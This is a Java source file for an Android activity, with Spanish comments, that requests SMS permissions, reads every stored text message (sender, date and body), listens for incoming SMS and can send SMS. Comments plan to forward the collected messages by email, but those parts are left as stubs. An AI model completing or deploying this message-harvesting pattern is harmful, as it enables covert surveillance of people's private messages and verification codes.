import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

// ... (Importaciones para enviar correo electrónico, como JavaMail)

public class AccesoSMS extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 101;
    private static final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
    };

    private SmsBroadcastReceiver smsReceiver;

    // ... (resto de tu actividad)

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // ... (tu código de inicialización)

        solicitarPermisos();

        // Registra el BroadcastReceiver para recibir nuevos SMS
        smsReceiver = new SmsBroadcastReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Desregistra el BroadcastReceiver al destruir la actividad
        unregisterReceiver(smsReceiver);
    }

    private void solicitarPermisos() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!tienePermisos()) {
                ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
            } else {
                leerSMS();
            }
        } else {
            // En versiones anteriores a Marshmallow, los permisos se otorgan en la instalación
            leerSMS();
        }
    }

    private boolean tienePermisos() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                leerSMS();
            } else {
                // El usuario denegó los permisos
                Log.e("AccesoSMS", "Permisos denegados");
                // Aquí puedes mostrar un mensaje al usuario o tomar alguna acción
            }
        }
    }

    private void leerSMS() {
        ContentResolver contentResolver = getContentResolver();
        Uri uri = Telephony.Sms.CONTENT_URI;
        String[] projection = new String[]{
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE,
                Telephony.Sms.BODY
        };

        Cursor cursor = contentResolver.query(uri, projection, null, null, null);

        StringBuilder smsInfo = new StringBuilder();
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));

                String formattedDate = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date(date));

                smsInfo.append("Nombre/Número: ").append(address).append("\n");
                smsInfo.append("Fecha: ").append(formattedDate).append("\n");
                smsInfo.append("Contenido: ").append(body).append("\n");
                smsInfo.append("------------------------\n");
            } while (cursor.moveToNext());
            cursor.close();
        }

        // Aquí puedes mostrar la información en la actividad o enviarla por correo electrónico
        // enviarCorreoElectronico(smsInfo.toString());
    }

    // BroadcastReceiver para recibir nuevos SMS
    private class SmsBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
                // Procesa el nuevo SMS recibido
                procesarSMSRecibido(intent);
            }
        }
    }

    private void procesarSMSRecibido(Intent intent) {
        // ... (Implementa la lógica para procesar el SMS recibido y enviarlo por correo electrónico)
    }

    // Método para enviar SMS
    private void enviarSMS(String numero, String mensaje) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(numero, null, mensaje, null, null);
            Toast.makeText(getApplicationContext(), "SMS enviado.", Toast.LENGTH_LONG).show();

            // Recopila la información del SMS enviado y envíala por correo electrónico
            // ...
        } catch (Exception e) {
            Toast.makeText(getApplicationContext(), "Error al enviar SMS.", Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    // ... (Métodos para enviar el correo electrónico)
}
